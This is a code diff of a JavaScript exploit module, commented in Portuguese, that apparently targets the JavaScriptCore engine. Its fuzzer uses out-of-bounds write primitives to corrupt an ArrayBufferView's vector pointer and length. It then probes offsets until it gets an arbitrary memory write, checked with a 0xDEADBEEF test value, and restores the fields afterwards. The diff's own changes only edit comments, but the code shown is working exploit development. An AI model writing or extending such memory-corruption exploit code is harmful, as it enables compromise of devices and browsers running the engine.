@@ -6,16 +6,15 @@ import {
     triggerOOB_primitive,
     clearOOBEnvironment,
     oob_write_absolute,
-    getOOBDataView // NOVO: Precisamos de acesso direto ao DataView
+    getOOBDataView // NOVO: Importando a função para acesso direto.
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
 export const FNAME_MODULE_STABLE_FUZZER_R47 = "Heisenbug_StableOffsetFuzzer_R47";
 
-// NOVO: Função de leitura síncrona "leve" que não desestabiliza o heap.
+// Função de leitura síncrona "leve" que não desestabiliza o heap.
 function sync_oob_read_32(dataview, offset) {
     if (!dataview) return 0;
-    // Lê um inteiro de 32 bits (4 bytes) no offset especificado.
     return dataview.getUint32(offset, true); // true para little-endian
 }
 
@@ -51,7 +50,7 @@ export async function executeStableOffsetFuzzer_R47() {
         const M_VECTOR_OFFSET = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
         const M_LENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
         const FUZZ_START_OFFSET = 0x20;
-        const FUZZ_END_OFFSET = 0x800; // Aumentei a faixa de busca
+        const FUZZ_END_OFFSET = 0x800; // Faixa de busca aumentada
         const FUZZ_STEP = 0x4;
 
         for (let offset_guess = FUZZ_START_OFFSET; offset_guess < FUZZ_END_OFFSET; offset_guess += FUZZ_STEP) {
@@ -74,13 +73,12 @@ export async function executeStableOffsetFuzzer_R47() {
             const TEST_VALUE = 0xDEADBEEF;
             const test_index = TEST_ADDRESS / 4;
             
-            // Adicionado um try/catch aqui pois uma corrupção errada pode travar o acesso.
             let read_back_value = -1;
             try {
                 victim_array[test_index] = TEST_VALUE;
                 read_back_value = victim_array[test_index];
             } catch (e) {
-                // Ignora erros, pois são esperados em offsets errados.
+                // Ignora erros
             }
             
             // 4. Restaura a memória de forma SÍNCRONA
@@ -88,12 +86,12 @@ export async function executeStableOffsetFuzzer_R47() {
             oob_write_absolute(vector_write_target + 4, original_vector_high, 4);
             oob_write_absolute(length_write_target, original_length, 4);
             
-            // 5. Verifica o resultado do teste
+            // 5. Verifica o resultado
             if (read_back_value === TEST_VALUE) {
                 result.success = true;
                 result.msg = `Offset funcional encontrado: ${toHex(offset_guess)}`;
                 logS3(`[Fuzzer] SUCESSO! ${result.msg}`, 'vuln');
-                break; // Encontrou, sai do loop
+                break; 
             }
         }
 
